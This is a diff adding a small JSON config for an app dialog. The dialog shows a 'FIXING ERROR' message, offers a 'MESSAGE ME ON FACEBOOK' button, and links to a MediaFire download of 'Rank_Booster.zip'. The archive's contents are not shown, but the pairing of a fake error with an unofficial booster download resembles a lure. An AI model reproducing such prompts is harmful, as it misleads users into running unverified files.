@@ -1,1 +1,10 @@
-
+{
+  "Visibility": "VISIBLE",
+  "Title": "FIXING ERROR",
+  "Description": "please wait a few minutes",
+  "MainTextButton": "MESSAGE ME ON FACEBOOK",
+  "Cancelable": "true",
+  "CancelButtonText": "EXIT",
+  "DownloadLink": "https://www.mediafire.com/file/q31nfz3ql00l9ox/Rank_Booster.zip/file",
+  "Version": "1.3"
+}
